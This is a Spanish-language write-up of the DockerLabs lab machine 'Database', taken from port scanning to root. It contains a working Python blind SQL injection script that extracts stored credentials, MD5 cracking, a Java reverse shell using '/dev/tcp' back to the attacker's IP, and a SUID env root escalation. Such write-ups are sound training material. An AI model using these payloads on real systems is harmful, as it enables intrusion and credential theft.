#MAQUINA #DOCKERLABS #MEDIO 
#SQLI #MANUAL_SQLI #PYTHON_SQLI 
#ENUM4LINUX #CRACKMAPEXEC #SMBMAP #SMBCLIENT 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Database** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 10:40 CET
Initiating ARP Ping Scan at 10:40
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 10:40, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:40
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 445/tcp on 172.17.0.2
Discovered open port 139/tcp on 172.17.0.2
Completed SYN Stealth Scan at 10:40, 0.51s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-18 10:40:52 CET for 1s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** ,el puerto **22(SSH)** y los puertos **139** y **445** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80,139,445 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 10:41 CET
Nmap scan report for 172.17.0.2
Host is up (0.000013s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Iniciar Sesi\xC3\xB3n
|_http-server-header: Apache/2.4.52 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-18T09:41:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.51 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 10:42 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds

enum4linux 172.17.0.2
 ========================================( Users on 172.17.0.2 )========================================
                                                                                                                                                                                          
index: 0x1 RID: 0x3e9 acb: 0x00000010 Account: dylan    Name: dylan     Desc:                                                                                                             

user:[dylan] rid:[0x3e9]

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                               
                                                                                                                                                                                          
S-1-22-1-1000 Unix User\dylan (Local User)                                                                                                                            
S-1-22-1-1001 Unix User\augustus (Local User)
S-1-22-1-1002 Unix User\bob (Local User)


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## SMB (445)

Con enum4linux sacamos un usuario -> **dylan**.

# EXPLOTACION

Vemos que en el login hay un **SQLI**. Lo explotamos con un script en python :

```bash
#!/usr/bin/env python3

import requests
import string

main_url = "http://172.17.0.2/index.php"
characters = string.ascii_lowercase + string.ascii_uppercase + "/*-_"+"1234567890"

def get_num_columns():

	found = False
	i = 256
	while(not found and i >= 0):
		data = f"name=a'order by {i}-- -&password=w&submit="

		r = requests.post(main_url,data=data,headers={"Content-Type": "application/x-www-form-urlencoded"})

		if("Wrong" in r.text):
			found = True
		if(not found):
			i = i - 1
	if(found):
		return i
	else:
		return 0
		
def get_database():

	found = False
	i = 0
	while(not found and i < 256):
		data = f"name=a'or (select length(database()))={i} -- -&password=w&submit="

		r = requests.post(main_url,data=data,headers={"Content-Type": "application/x-www-form-urlencoded"})

		if("Wrong" not in r.text):
			found = True
		if(not found):
			i = i + 1

	if not found:
		return 0
	db=""
	
	for position in range(1,(i + 1)):
		for character in characters:

			data = f"name=a' or (select substring((select database()),{position},1)) = '{character}'-- -&password=w&submit="
		    
			r = requests.post(main_url,data=data,headers={"Content-Type": "application/x-www-form-urlencoded"})
		
			if("Wrong" not in r.text):
				db += character
				break
	return db
def get_tables():

	tables=""
	
	for position in range(1,300):
		for character in characters:

			data = f"name=a' or (select substring((select group_concat(table_name) from information_schema.tables where table_schema = 'register'),{position},1)) = '{character}'-- -&password=w&submit="
		    
			r = requests.post(main_url,data=data,headers={"Content-Type": "application/x-www-form-urlencoded"})
		
			if("Wrong" not in r.text):
				tables += character
				break
	return tables
			
def get_columns():

	cols=""
	
	for position in range(1,100):
		for character in characters:

			data = f"name=a' or (select substring((select group_concat(column_name) from information_schema.columns where table_schema = 'register' and table_name='users'),{position},1)) = '{character}'-- -&password=w&submit="
		    
			r = requests.post(main_url,data=data,headers={"Content-Type": "application/x-www-form-urlencoded"})
		
			if("Wrong" not in r.text):
				cols += character
				break
	return cols

def get_data():

	datos=""
	
	for position in range(1,150):
		for character in characters:

			data = f"name=a' or (select substring((select group_concat(username ,'-', passwd) from register.users),{position},1)) = '{character}'-- -&password=w&submit="
		    
			r = requests.post(main_url,data=data,headers={"Content-Type": "application/x-www-form-urlencoded"})
		
			if("Wrong" not in r.text):
				datos += character
				break
	return datos

if __name__ == '__main__':

	cols = get_num_columns()
	print(f"[+] Number of columns -> {cols}")
	
	database = get_database()
	print(f"[+] Database-> {database}")

	data = get_data()
	print(f"[+] Data-> {data}")
	
	
```

La salida :
```bash
./script.py       
[+] Number of columns -> 2
[+] Database-> register
[+] Data-> dylan-kjsdfg789fgsdf78

```

Al probar la contra no funciona, pero veo que al poner en mayúsculas puedo entrar al SMB.

Vamos a ver que podemos ver gracias a **smbmap**:

```bash
smbmap -H 172.17.0.2 -u dylan -p KJSDFG789FGSDF78     

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        shared                                                  READ, WRITE
        IPC$                                                    NO ACCESS       IPC Service (a3706ffc3f1c server (Samba, Ubuntu))
[*] Closed 1 connections
```

Usamos **smbclient** para conectarnos :
```bash
smbclient //172.17.0.2/shared -U dylan                  
Password for [WORKGROUP\dylan]:
Try "help" to get a list of possible commands.
smb: \> get augustus.txt 
getting file \augustus.txt of size 33 as augustus.txt (330000.0 KiloBytes/sec) (average inf KiloBytes/sec)
smb: \> exit

```

Tenemos una nota.

```bash
cat augustus.txt                                        
061fba5bdfc076bb7362616668de87c8
john --format=Raw-Md5 --wordlist=/usr/share/wordlists/rockyou.txt augustus.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
lovely           (?)     
1g 0:00:00:00 DONE (2025-03-18 12:43) 100.0g/s 76800p/s 76800c/s 76800C/s 123456..james1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```

YA ESTAMOS COMO AUGUSTUS.

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
augustus@a3706ffc3f1c:~$ sudo -l
[sudo] password for augustus: 
Matching Defaults entries for augustus on a3706ffc3f1c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User augustus may run the following commands on a3706ffc3f1c:
    (dylan) /usr/bin/java


```

Vemos **java** con permisos SUDO  :

   ```bash
augustus@a3706ffc3f1c:/tmp$ cat shell.java
public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.17.0.1/443 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
augustus@a3706ffc3f1c:/tmp$ javac shell.java 
augustus@a3706ffc3f1c:/tmp$ sudo -u dylan /usr/bin/java shell


```

```bash

nc -nlvp 443 
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 46600
dylan@a3706ffc3f1c:/tmp$ 

```

YA ESTAMOS COMO DYLAN.

Vemos si hay archivos con permisos SUID:
   ```bash
dylan@a3706ffc3f1c:~$ find / -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/env
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper



```

Vemos **env** con permisos SUID  :

   ```bash
dylan@a3706ffc3f1c:~$ /usr/bin/env bash -p
bash-5.1# whoami
root
bash-5.1# 

```

**YA ESTAMOS COMO ROOT.**